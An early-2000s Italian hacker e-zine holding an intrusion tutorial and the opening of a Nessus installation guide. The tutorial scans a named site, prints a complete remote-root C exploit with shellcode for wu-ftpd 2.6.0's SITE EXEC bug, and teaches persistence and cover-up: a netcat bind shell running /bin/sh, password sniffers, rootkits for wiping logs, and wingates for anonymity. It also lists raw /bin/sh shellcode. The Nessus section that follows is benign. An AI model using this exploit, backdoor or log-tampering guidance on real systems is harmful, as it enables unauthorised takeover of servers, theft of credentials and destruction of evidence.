leggete il tutorial di pex3 sull'utilizzo del nessus, lo trovate all'interno di
questa e-zine ;)

SATAN = ( o SANTA ) è un programma che gira sotto macchine Unix-like e richiede 
perl5.0, un browser (netscape và bene),32 MB di ram;
questo programma consente l'analisi di reti e sottoreti di un sistema
per trovare falle e aperture


La ditta consiglia : Indubbiamente il nessus... questo può essere
un pò rognoso nell'installazione ma vi darà dei risultati certi!
In ogni scan cmq nn deve mancare un bell'nmap, meglio se installate nmap prima
di nessus, in modo che quest'ultimo ne possa utilizzare le features per il
fingerpinting e simili...


Iniziamo con un pò di pratica : anche nel nostro amato linux direi che
lo spoofing è essenziale quindi...

Scanniamo un sito con il nostro fido nmap: il risultato sarà...

[root@localhost vlad]# nmap -sS www.sitopalestrato.org

Starting nmap V. 2.54BETA22 ( www.insecure.org/nmap/ )
Interesting ports on grex.cyberspace.org (216.93.*.*):
(The 1525 ports scanned but not shown below are in state: closed)
Port       State       Service
21/tcp     open        ftp
22/tcp     open        ssh
23/tcp     open        telnet
25/tcp     open        smtp
37/tcp     open        time
53/tcp     open        domain
79/tcp     open        finger
80/tcp     open        http
110/tcp    open        pop-3
111/tcp    open        sunrpc
113/tcp    open        auth
513/tcp    open        login
540/tcp    open        uucp
709/tcp    open        entrustmanager
3000/tcp   open        ppp
8080/tcp   open        http-proxy
12345/tcp  open        Altro servizio ftp(No!! nn è il NetBus, dudes!:)

Nmap run completed -- 1 IP address (1 host up) scanned in 24 seconds

Bene... fatto ciò abbiamo il materiale su cui iniziare... sappiamo che
sul sito gira ReadHat(se aggiungete -O alle opzioni dell'nmap) e telnettandoci
ai vari demoni scopriremo le loro versioni... tra cui... cosa cosa???
wu-ftpd 2.6.1?? bhè mica male calcolando che ultimamente è stato rilasciato
un bell'exploit per suddetto (che paroloni!!) software(accio)!! Facciamo una
capatina sui nostri soliti database di exploit e becchiamoci il codice!!! Lo
compiliamo e.... l'admin è fottuto!!
(pex3 consiglia www.packetstormsecurity.com ...ovviamente ;-)

Vediamo un pò la cosa da più vicino!!!

|---------------------------------------------|
| Wu-ftpd .... benedetto chi l'ha inventato :P|
|---------------------------------------------|

Allora.... la prima versione che intendo analizzare è la 2.6.0... le
precedenti le troverete difficilmente in quanto sono talmente piene di buchi
che nn credo esista ancora qualche pazzo che le monta... almeno non pachate!
(hihihi... io sono il solito fortunato... ho una shella che monta wuftp 2.4.4
che chiamo amichevolmente "gruvi", n.d.pex3 ;-)
Well... di seguito troviamo un bell'exploit in allegato... vi da il root(wooo)
su in qualsiasi versione di linux.... è da remoto...e necessita di anonymous:(
Se lo chiamate expl.c da shell basterà fare(ormai dovreste averlo capito):

gcc expl.c -o expl
./expl <e i vari argomenti>

e con un pò di culo... siete root... ora attenti a non farvi beccare!!

Ma su che si basa l'exploit?? Buona domanda!! Su un buffer overflow ovviamente
e più di preciso sull'overflow nel SITE EXEC...che provoca... a come possiamo
vedere un bel casino(un miracolo per noi) nello stack!!... La shell è NOSTRA!
Anzi... vostra!
(messaggio x la gdf & company: mi dissocio :-P, n.d.pex3)

<<<<------CUT HERE-------------------------------------->>>
/*
 * Linux wu-ftpd - 2.6.0(1) (tested on RH6.2 wu from rpm)
 *
 * vsz_
 */

#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>

char linuxcode[] =
  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
  "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
  "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"
  "\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"
  "\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"
  "\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"
  "\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"
  "\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  "\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"
  "\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31";


main (int argc, char *argv[])
{

  char cmdbuf[8192];
  char cbuf[1024];
  char *t;
  char nop[400];
  int pip, i, a = 22, st = 0;
  struct sockaddr_in sck;
  struct hostent *hp;
  long inet;
  int port = 21;
  fd_set fds;
  unsigned int aa;
  long reta, retb, tmp, retz;
  int ret;
  int add = 0;

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  memset (cbuf, 0x0, sizeof (cbuf));
  memset (nop, 0x0, sizeof (nop));

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s [ip] \n", argv[0]);
      exit (-1);
    }

  pip = socket (PF_INET, SOCK_STREAM, 0);

  if (!pip)
    {
      perror ("socket()");
      exit (-1);
    }

  inet = inet_addr (argv[1]);
  if (inet == -1)
    {
      if (hp = gethostbyname (argv[1]))
	memcpy (&inet, hp->h_addr, 4);
      else
	inet = -1;
      if (inet == -1)
	{
	  fprintf (stderr, "Cant resolv %s!! \n", argv[1]);
	  exit (-1);
	}
    }
  sck.sin_family = PF_INET;
  sck.sin_port = htons (port);
  sck.sin_addr.s_addr = inet;

  if (connect (pip, (struct sockaddr *) &sck, sizeof (sck)) < 0)
    {
      perror ("Connect() ");
      exit (-1);
    }

  read (pip, cbuf, 1023);
  fprintf (stderr, "Connected to: %s \n", argv[1]);
  fprintf (stderr, "Banner: %s \n", cbuf);
  strcpy (cmdbuf, "user ftp\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  memset (nop, 0x90, sizeof (nop) - strlen (linuxcode) - 10);

  strcat (nop, linuxcode);

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  sprintf (cmdbuf, "pass %s\n", nop);
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  if (!strncmp (cmdbuf, "530", 3))
    {
      printf ("loggin incorrect : %s \n", cmdbuf);
      exit (-1);
    }
  fprintf (stderr, "Logged in.. \n");
  fprintf (stderr, "+ Finding ret addresses \n");
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  strcpy (cmdbuf, "SITE EXEC %x %x %x %x +%x |%x\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  if (!strncmp (cmdbuf + 4, "%x", 2))
    {
      fprintf (stderr, "[1m[31mWuftpd is not vulnerable : %s \n[0m",
	       cmdbuf);
      exit (-1);
    }
  else
    {
      fprintf (stderr, "[1m[32mWuftpd is vulnerable : %s \n[0m", cmdbuf);
    }
  reta = strtoul (strstr (cmdbuf, "|") + 1, strstr (cmdbuf, "|") + 11, 16);
  retz = strtoul (strstr (cmdbuf, "+") + 1, strstr (cmdbuf, "|") + 11, 16);

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  strcpy (cmdbuf, "SITE EXEC ");
  for (ret = 0; ret <= 88; ret++)
    {
      strcat (cmdbuf, "%x");
    }
  strcat (cmdbuf, "|%x\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  retb = strtoul (strstr (cmdbuf, "|") + 1, strstr (cmdbuf, "|") + 11, 16);
  printf ("Ret location befor: %x \n", reta);
  if (reta == 0)
    reta = retz;
  else
    add = 600;
  reta = reta - 0x58;
  retb = retb + 100 - 0x2569 - add;
  printf ("Ret      location : %x \n", reta);
  printf ("Proctitle addres  : %x and %u \n", retb, retb);
  sleep (2);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));

  sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	   (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	   (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
  a = 22;
  memset (cbuf, 0x0, sizeof (cbuf));
  while (1)
    {

      memset (cmdbuf, 0x0, sizeof (cmdbuf));

      sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	       (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	       (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
      for (i = 0; i <= 128; i++)
	strcat (cmdbuf, "%.f");
      for (i = 0; i <= a; i++)
	strcat (cmdbuf, "%d");
      sprintf (cbuf, "|%%x|%%x\n", aa + 9807 - 460);
      strcat (cmdbuf, cbuf);
      write (pip, cmdbuf, strlen (cmdbuf));
      memset (cmdbuf, 0x0, sizeof (cmdbuf));
      read (pip, cmdbuf, sizeof (cmdbuf) - 1);
      t = (char *) strstr (cmdbuf, "|");
      tmp = strtoul (t + 1, t + 11, 16);
      if (tmp != 0)
	{
	  fprintf (stderr, "tmp 1  : 0x%x\n", tmp);
	  if (tmp == reta)
	    {
	      fprintf (stderr, "Cached a : %d \n", a);
	      st = 1;
	      break;
	    }
	  tmp = strtoul (t + 11, t + 22, 16);
	  fprintf (stderr, "tmp 2  : 0x%x\n", tmp);
	  if (tmp == reta)
	    {
	      fprintf (stderr, "Cached a : %d \n", a);
	      st = 2;
	      break;
	    }
	}
      if (st > 0)
	break;
      a++;
    }
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  memset (cbuf, 0x0, sizeof (cbuf));

  sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	   (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	   (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
  for (i = 0; i <= 128; i++)
    strcat (cmdbuf, "%.f");
  if (add != 600)
    a = a - 1;
  fprintf (stderr, "Trying with : %d \n", a);
  for (i = 0; i <= a; i++)
    strcat (cmdbuf, "%d");

  aa = retb;
  if (add == 600)
    sprintf (cbuf, "|%%.%ud%%n\n", aa + 9807);
  else
    sprintf (cbuf, "|%%.%ud%%n\n", aa + 9807 - 480);

  strcat (cmdbuf, cbuf);
  write (pip, cmdbuf, strlen (cmdbuf));
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));

  fprintf (stderr, "[1m[33m Wait for a shell.....\n[0m");


  while (1)
    {
      FD_ZERO (&fds);
      FD_SET (0, &fds);
      FD_SET (pip, &fds);
      select (255, &fds, NULL, NULL, NULL);
      if (FD_ISSET (pip, &fds))
	{
	  memset (cbuf, 0x0, sizeof (cbuf));
	  ret = read (pip, cbuf, sizeof (cbuf) - 1);
	  if (ret <= 0)
	    {
	      printf ("Connection closed - EOF \n");
	      exit (-1);
	    }
	  printf ("%s", cbuf);
	}
      if (FD_ISSET (0, &fds))
	{
	  memset (cbuf, 0x0, sizeof (cbuf));
	  read (0, cbuf, sizeof (cbuf) - 1);
	  write (pip, cbuf, strlen (cbuf));
	}
    }
  close (pip);
}
/*                   www.hack.co.za   [26 September 2000]*/

<<----------CUT HERE--------------------------------------->>>>


Ok... un vero attakko rikiede solitamente(a volte basta una procedura simile
a questa) più tempo... ma la teoria è questa:

1) FootPrinting
   Fingerprinting   ---> Ricavo tutte le info possibili
   Port Scanning
   Vulnerability
        Scanning
2) Cerco document.  ----> Trovo exploit per accedere al sistema e/o documentazione
                          sulle vulnerabilità
3)ENTRO!!           -----> Facendo attenzione all'anonimità
4)Mantengo          -----> che è la procedura più difficile! Quindi sotto con la
 l'accesso                 prossima parte del tutorial!! (è anche la più utile, a
                                                          meno che non volete 
                                                          _lamerosissimamente_ 
                                                          defacciarlo..., n.d.pex3)

------------------------------------------------------------------------

|-----------------------------------------|
|  Come mantenere l'accesso al sistema??  |
|-----------------------------------------|

Sono sicuro ke da quanto siete profondamente imbranati entrati
la prima volta,la seconda troverete il sito pachato o le passw
cambiate ...quindi...sotto con le backdoor!!!!!

Allora... la backdoor più semplice è aggiungere un utente con pieni
privilegi al file delle passwd... cosa che nn mi soffermo neanche ad analizzare
in quanto 1) sapete sicuramente come farlo da voi e 2) il file delle passwd è la
prima cosa (dopo i log:) che un admin va a guardare dopo che vi ha beccati nella sua
macchina quindi...

L'arternativa + semplice è il NetCat: con questo bel programmino potete restare in
ascolto su una determinata porta del sistema(consiglio una abb alta) e appena vi
ci connettete eseguire un programma... ad esempio un bel /bin/sh/ che vi ritornerà il
root in quanto il netcat lo avete lasciato in background da root... rocordate?? WOW!

Per fare questo, una volta installato il netcat basta scrivere da shell:

# nc -L -e /bin/sh -p 31345 &

così il NetCat resterà in background in ascolto sulla 31345... e voi vi connetterete ad
esso sempre utilizzando il NC vi darà la shell bella e pronta :) semplice no??

Altra cosa importante è l'uso degli sniffers... così, se l'admin cazzuto cambia le passwd
voi le troverete tutte nel log del tool... pronte per essere utilizzate!
Per sniffare SOLO le passwd di linux direi che il miglior tool è senza dubbio LinSniff
che potete trovare su packetstorm(e dove sennò:)... mentre se volete uno sniff + "massiccio"
che cattura tutti i pacchetti che passano sulla rete potete usare lo sniffer di Clearhout
che trovate sempre(non lo dirò più) su packetstorm! A voi la scelta... anche se secondo me
più semplici sono le cose meglio è... poi dipende da cosa volete fare!! ;)


Consigli :

* Lasciate nel serverino come ricordo una bella backdoors

* Lanciare uno sniffer in background .In questo modo se cambiano
la password di root potrete riprenderla per mezzo del log dello sniffer.


|------------------|
| E i log in Unix??|
|------------------|


Arrivo... arrivo... wow... ero andato un attimo a... hemm... fare pipì
... cmq... per questa operazione io consiglio di non fare la cosa manualmente in
quanto editare (non si cancellano MAI i log file) richiede abbastanza tempo...
visto che su unix/linux possiamo utilizzare i rootkit... perchè non farlo??
Sul solito sito che ormai non riesco neanche più a pronunciare ne trovate a iosa
...in particolare consiglierei knark... che contiene sniffer, backdoor, pulizia log
e altri particolari gingilli utili ad ogni brav'oumo che vuole bucherellare in
santa pace... comuque non dimenticatevi MAI che non si può mai essere anonimi al
100% quindi... sotto anche con i wingate... e con le preghiere! ;)

Se vi piace lavorare a mano consiglio il seguente tut :
http://members.xoom.it/nfzkrew/tutorial/log.txt
(tratto _o rippato? :-P_ da "hacker!2.0" ===^, n.d.pex3)

------------------Parliamo un pò degli Exploit------------------------

Come abbiamo già detto e ripetitamo gli expoit sono :
applicazioni scritti con linguaggi
di programmazione (c,c++,perl) che aiutano noi hacker
ad avere accesso al server root

Una volta trovato un exploit.c ke si fa ?

Uploddarli sul server via ftp con il comando PUT
e poi li compilate da telnet con il comando gcc

gcc file.c -o file
./file

mentre per gli script in perl e/o in sh non è neccessaria la
compilazione in quanto sono interpretati... quindi basta fare:

chmod +700 <nomefile>
./<nomefile>

E avrete eseguito il vostro exploit sul server !!

Ci sono expoit ke vanno eseguiti in remoto
ovverro , ke nn necessitano un accesso al server da
hackerare e potrete lanciarli dalla vostra makkina

Consigli x l'uso :

Lanciare un exploit sulla vostra makkina  è rischioso allora
o eseguiteli da un altra makkina in cui avete accesso oppure potrete
eseguirli da una vostra shell ...

Dove trovarli:

Nei soliti siti che già abbiamo nominato fino alla nausea! :)
Ed ovviamente in tutti i vari siti che riguardano la sicurezza

----------------- TELNET ------------------------

Telnet nn è altro ke un semplicissimo client ...
quello ke fa exploit lo esegue telnet in backdoor

Potrete trovare qualke difficoltà ad usarlo bene xkè
usa comandi unix ... smanettate un pò :


Comandi


cd         sintassi: cd dyrectory 'porta alla directory specificata
-            -
cd ..      riporta alla directory precedente
-            -
pwd        indica la directory remota
-            -
compress   sintassi: compress [-v] file   'comprime un file = .Z
-            -
zcat       visualizza il contenuto di un txt in un archivio compresso
-            -
cp         sintassi: cp file directory    'copia un file
-            -
date       da informazioni sulla data
-            -
ls         mostra contenuto directory remota
-            -
du         informa sullo spazio occupato dai vostri file
-            -
history    mostra l'elenco dei comandi usati
-            -
id         informa sul propio id
-            -
less       sintassi: less file    'mostra il contenuto di un file
-            -
man        sintassi: man comando   'mostra informazioni sul comando
-            -
mkdir      sintassi: mkdir directory   'crea nuova directory
-            -
netstat    da informazioni sullo stato della rete
-            -
pico       sintassi: pico file    'editor di testo
-            -
rm         sintassi: rm file   'elimina file
-            -
rmdir      sintassi: rmdir directory    'elimina directory
-            -
vi         editor di testo un pò complicato

Spazio     Avanza di una pagina
-
Invio      Avanza di una linea.
-
b          Si sposta indietro di una pagina.
-
man comando   Mostra il manuale corrispondente al comando inserito
-

Questi sono i principali comandi unix ... nn tutti saranno eseguibili
sul vostro telnet .. ma studiarseli .. fa male :)

mmm spero sia tutto kiaro fin qua :)
se vi domande xkè dovreste usare una shell o a cosa vi serve
vi kiarisco subito il concetto ....

La shell nn è altro ke l'intermediario fra noi ed il kernel ...
è un semplice programma ke si occupa ti accettare il nostro input, e
di restituire il suo corrispettivo output ..
NN avendo mai visto una linux , nn vi rendete conto di quanto sia facile
poter capire ... ma nel nostro caso .. la utilizzeremo x hackerare

I termini pratici se dovete lanciare un exploit o entrare in un determinato
server nn lo faremo dal nostro bel telnet ma prima ci connetteremo alla shell
in modo tale ke se venissimo loggati, nn lasciaremo sparso x tutto il server
il nostro ip ma quello della shell...
Nn pensate ke vi basti avere una shell x essere tranmquilli xkè nn è così
dovrete sempre esagerare , prima di collegarvi da telnet alla vostra shell
passate prima x un wingate ...

Dove mi procuro una shell ?

* Controllare se il vostro provider vi ha già dato una shell account.
(Vari provider offrono shell account gratis)
(dove lo hai letto? sulla guida di lord shinva?
con tutto il rispetto per LordShinva, ma è un po' vecchiotta :-P
non ci sono buone shell gratuite... cmq se le trovate mailatemele anche
a me: pex3@fuckwindos.com?subject=aaa_ottime_shelle_gratuite_, n.d.pex3)

* Compratela .. i costi nn sono molto elevati .. ed avere una shell
  è molto comodo

* Fatevela prestare da qualke amico :P

* Hackatevela ... la teoria l'avete , sarebbe un ottimo esercizio :P
(ovviamente x gdf: pex3 si dissocia... ;-), n.d.pex3)
>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>

Bene... in quest' ultima parentesi vorrei trattare i BufferOverflow... innanzi
tutto cosa sono?? Sono dei difetti di programmazione nei software... oggi possiamo
dire che l'80% degli exploit in circolazione esistono grazie esclusivamente a
queste pericolose distrazioni dei programmatori. (...e ad aleph1, n.d.pex3)
Non sono affetti da BufferOverflow solo i programmi più economici o quelli 
ideati da programmatori mediocri! Anzi...
molte volte proprio i software più costosi e famosi soffrono di questo bug...
quindi... capite bene l'importanza che ha, per un hacker (?), il saper sfruttare
adeguatamente un potenziale mezzo per raggiungere il completo controllo del sistema
... In qiesto articolo non è mia intenzione addentrarmi nei meandri dell'argomento
sia perchè sarebbe troppo lungo, ma anche perchè al momento la mia competenza sui
BO non è delle migliori... mi sto documentando... quindi se rimanete sintonizzati
su #noflyzone (whoooo) potrete molto presto trovare un nuovo lungo tutorial in merito
...ora vi spiegheroò solo la teoria...

Allora... il tutto si basa sul fatto che molte volte i programmi non fanno un
controllo sulla lunghezza dell'input...  (google: validazione dell'input, n.d.pex3)
questo, come è comprensibile viene allocato in memoria a partire da un indirizzo.
E verrà trattato come una normale variabile...
ma ovviamente avrà anche un indirizzo di fine... ha uno spazio limitato una variabile
!! E provate ad immaginare cosa succederebbe se questa variabile che per esempio è della
dimensione di 5 byte dovesse occupare più di 5 byte? Ovviamente Il buffer (5 byte)
andrebbe letteralmente in Overflow sovrascrivendo una zona di memoria dedita ad altre
operazioni...e se noi conoscessimio l'indirizzo dello stack, dove ci sono le istruzioni
che la macchina sta per eseguire??? non potremmo forse andare con una variabile un attimo
(bhè... non proprio un attimo) più grande del normale a sovrascrivere le istruzioni che
stanno sullo stack???? Certo che si! Se ci riusciamo... bhè... eseguire un bel /bin/sh
come root mi sembra il minimo, no??

OK...Ok.... non è così semplice... la parte pratica è moooooolto più complicata...ma come
vi ho detto presto troverete nuove info in merito! Quindi... occhio a
www.noflyzone-crew.cjb.net!!!!!
(naaa.. occhio a BFi, che è meglio.... ,n.d.pex3)

P.S. cmq per non lasciarvi al secco proprio del tutto vi anticipo qualche shellcode
faticosamente(seee come no!!) ricavato!! Lo shell code non è altro quello che dovete
iniettare nello stack per far eseguire quello che volete far fare alla macchina...
Ovviamente dipende dal sistema operativo e dalla macchina (in senso anche di hardware,
un explo per x86 non runna su sparc per es., n.d.pex3) quindi:

Chiaro che dovete avere un' infarinatura dell' assembly... altrimenti nisba!

LINUX x86

Bhè direi di iniziare da un semplice /bin/sh... sempre utile!!

char linux_bin_sh[]=
  "\x99"			/* cdq              */
  "\x52"			/* push %edx        */
  "\x68\x2f\x2f\x73\x68"	/* push $0x68732f2f */
  "\x68\x2f\x62\x69\x6e"	/* push $0x6e69622f */
  "\x89\xe3"			/* mov %esp,%ebx    */
  "\x52"			/* push %edx        */
  "\x54"			/* push %esp        */
  "\x54"			/* push %esp        */
  "\x59\x6a"			/* pop %ecx         */
  "\x0b\x58"			/* push $0x0b       */
  "\xcd\x80";			/* int $0x80        */

Che ne dite di scrivere qualcosa su un file di testo???

char linux_stdrout[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\xcd\x80\xeb\x20\x5e\x8d"
"\x1e\x88\x56\x09\xb0\x05\x66\xb9\x02\x0c\xcd\x80\x8d\x4b\x0a\x89"
"\xc3\xb0\x04\xb2\x11\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80\xe8\xdb"
"\xff\xff\xff/etc/Vlad vi ascolta\!\!\!\n";

Come ricavarli??? Vi spiegherò anche questo nel tutorial promesso! per ora vi basti
sapere che bisogna scrivere il codice in c... debuggarlo... vedere il corrispettivo
in assembly...e tradurlo in linguaggio macchina(che è praticamente uguale all'assebly
solo che le istruzioni invece che essere "capibili" in quanto in una lingua quasi capibile
dall'uomo;) come ad esempio "push" "move" ecc sono scritte in modo che siano capibili
dal processore della macchina quindi ad esempio "int"(interrupt) diventerà \xcd...
push %esp diventerà \x54 e così via... è un lavoraccio ma a noi piacciono i lavoracci, no?)

>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>_>

---------------------------------------------------------------------------------

Spero questa guida vi sia di aiuto a farvi capire quanto sia insicura la rete :P
Accettiamo la qualunque critike , complimenti , soldi , donne ;)
Venite a trovarci :)

----------------------------------------------------------------------------------

Saluti e dediche :**

Un salutone a tutta la NoFlyZone crew ad i chan #hack , #hackmaniaci
#linux-club e  #opensource ......

In particolare a :

P®egzt ed [Evil] ke indirettamente hano contribuito alla stesura
dell'articolo :P , Crashes , cityhunter , quasar , cyberz , federico
zukkerina83 , pex3 , lo0ker , oversys , dominus , _1/2Matto , Bigalex
MARSIO , e4m , hibrid2001 , diodeldragone , fossy  ecc ecc :P

Un particolare fuck a :

lonewolfden , reikon , tinospider e tutti gli altri
lameracci ke scannano le p*ll* , ma nn avete altro da fare ?


Dedichiamo questo tutorial a tutti coloro ke vogliono imparare e capire
quanto sia insicura la rete e nn dare cosigli in + al lamer di turno
su come rompere le palle!!

Dove trovarCi ?

irc.azzurra.org #NoFlyZone
[]LoRd[V]icio[] & [V]lad
(e a me mi lasciate fuori? vi ho pure rivisto sta cozzaglia :-P , n.d.pex3)

[pex3 on the air]

ehm...
anche a me mi trovate in azzurra... ;-) pex3

[pex3 off the hook]

 <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
 |Meditate Gente.... Meditate... è la cosa più utile che potete fare per il  |
 |mondo intero; che potete fare per voi... non lasciatevi manovrare!! MAI!!!!|
 <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

                _______________________________________
              [                                         ]
              [            Copyright (C) 2002           ]
              [                                         ]
              [ []LoRd[V]icio[]  lordvicio@hotmail.com  ]
              [   [V]lad         lord_zc@hotmail.com    ]
              [ _______________________________________ ]


------------------------------------*END*--------------------------------------

-------------------------------------[4]---------------------------------------
-----------------------------------[ pex3 ]------------------------------------
-----------------------------------[Nessus]------------------------------------feb 2002
 -----
-H2K^2-  ______  ____  __  __   ____
 -----   \  __ \/ __ \/  \/  \ /_   \
          | \_\   ___/\      <  _<  /
          |  __/\___  >__/\  / \__  /
          | |       \/     \/     \/
         /__|      WEB:
                 http://www.pex3.com/
                  -------------------
                   E-MAIL:
                 pex3@fuckwindows.com
                  -------------------
                   IRC: #NoFlyZone #ubrihackers
                 #smanettoni #rotfl #hack #php
                   #hackmaniaci #italia-underground
                 #hackarena #linux-club #linux-maina
                   #opensource #spippolatori #ondaquadra
                 irc.azzurranet.org:6667
                  ----------------------

+-------------------------------------------------------------------------+
|                Nessus Security Scanner:                                 |
|                       Installing Configuring Updating & Running         |
+-------------------------------------------------------------------------+
|Autore: pex3                                                             |
|E-mail: pex3@fuckwindows.com                                             |
|Sito: http://www.pex3.com/                                               |
|IRC: irc.azzurranet.org:6667 #NoFlyZone                                  |
|Dedicated to: Charlie                                                    |
|Date: Febrary 2002                                                       |
|Text License: GNU GENERAL PUBLIC LICENSE Version 2                       |
|Al Suono di...                                                           |
|Gigi D'Agostino - Techno Fes Vol.2      GgDag:                           |
|Gigi D'Agostino - Il Grande Viaggio           The Best One ;-)           |
+-------------------------------------------------------------------------+

---------------------------------------------------------- About Nessus: --
Il sito di principale su cui trovare tutte le informazioni su
Nessus Security Scanner è:

        http://www.nessus.org/

Nessus è a mio parere il miglior "security scanner" free (opensource e non
commerciale, cioè gratuito e di libero utilizzo) in circolazione.
Un security scanner è un programma che scansiona uno (o più) host/ip alla
ricerca di falle di sicurezza, warning e informazioni varie riguardo al
server target, agli script e i servizi che vi girano.

Il testo di riferimento rimangono le faq ufficiali in lingua inglese,
reperibili sul sito ufficiale.

--------------------------------------------------- About this Tutorial: --
Mi sono deciso di scrivere questo tutorial perchè avendolo installato più
volte su sistemi operativi differenti (varie distribuzioni di linux e
windows) ho appreso una certa dimestichezza con le problematiche che si
incontrano nella sua installazione (decisamente non adatta ai principianti
senza un testo guida),nella configurazione iniziale e nel suo utilizzo.
Inoltre penso sia la prima guida in italiano a trattare di nessus, un
ottimo tool che necessita di essere scoperto anche dai newbie.

------------------------------------------------------------ Disclaimer: --
Premettendo che ogni cosa che qui è scritta non è nulla di illegale, ma
solo informazione sulla sicurezza dei sistemi informatici in internet e
sull'utilizzo di alcuni strumenti liberamente distribuiti nel web per
aumentarne e/o testarne l'efficacia degli stessi sottolineo che le
informazioni qui riportate sono a solo scopo informativo e non vogliono in
alcun modo essere da stimolo a violazioni della legge.
L'autore e coloro che distribuiranno questo testo, o parte di esso, non
saranno responsabili dell'uso che i lettori faranno di queste informazioni.
Ciò che è scritto qui sopra va integrato con i disclaimer presenti all'url:

  http://www.pex3.com/disclaimer.php

in quanto da considerarsi parte integrante del sito www.pex3.com e, in caso
di contraddizion tra ciò di cui scritto nei disclaimer specifici di questo
testo e ciò di cui nei disclaimer generali del sito www.pex3.com, avrà
valore inequivocabilmente più rilevante ciò di cui è riportato all'interno
di questo testo, in quanto specificatamente espresso rispetto a questo testo
stesso.

----------------------------------------------------- Dove lo reperisco: --
Dove lo reperisco? Ovviamente nella sezione download del sito ufficiale
http://www.nessus.org/ seguite i miei consigli:
- Se usate sistemi unix-like (linux) lo trovate sotto la voce "Posix
  System"
- Procedete con il download di tutti i 4 pacchetti (attualmente giunti alla
  versione stabile 1.0.10 e instabile 1.0.11, ma voi scaricate la stabile):

  nessus-libraries-1.0.10.tar.gz libnasl-1.0.10.tar.gz
  nessus-core-1.0.10.tar.gz      nessus-plugins-1.0.10.tar.gz

Oppure per i redhattiani consiglio di scaricare i pacchetti rpm
precompilati del sito FreeshRpms http://www.freshrpms.net/ perchè trovate
le ultime versioni in tempi davvero brevi rispetto al sito ufficiale ;-)
- Anche qui scaricate tutti e 4 i pacchetti rpm:

  nessus-libraries-1.0.10.rpm libnasl-1.0.10.rpm
  nessus-core-1.0.10.rpm      nessus-plugins-1.0.10.rpm

Se usate redhat 7.x o mandrake 8.x (i cui pacchetti sono compatibili)
questo sito va benissimo, mentre per quelli che non usano RedHat non saprei
che su che sito affidabile provare a cercare i pacchetti precompilati (rpm,
deb, ecc...), quindi vi consiglio di scaricare i tar.gz come detto sopra dal
sito di nessus così siete sicuri che vada e non abbia "strane" backdoor ;-)
Io uso SuSE e consiglio comunque di installare i tar.gz, che danno più
sicurezza ;-) anche se tra le distro che ho provato questa è quella che da
più difficoltà.

Siccome questa vuole essere una guida per i newbie sottolineo che il numero
1.0.10 potrebbe essere differente: questo non è un problema, probabilmente
avete una versione uscita successivamente alla scrittura di questa guida,
ma i passi da seguire non cambiano, ma solo i numeri da inserire. :-)

--------------------------------------------------------- Installazione: --
Se avete scaricato i pacchetti precompilati (rpm) siete già arrivati alla
fine dell'installazione (o quasi :P ), basterà infatti recarsi nella
directory dove avete salvato i 4 pacchetti *.rpm e digitare:
(eseguite i comandi in questasequenza!)

  su
  <inserite la password dell'utente root>
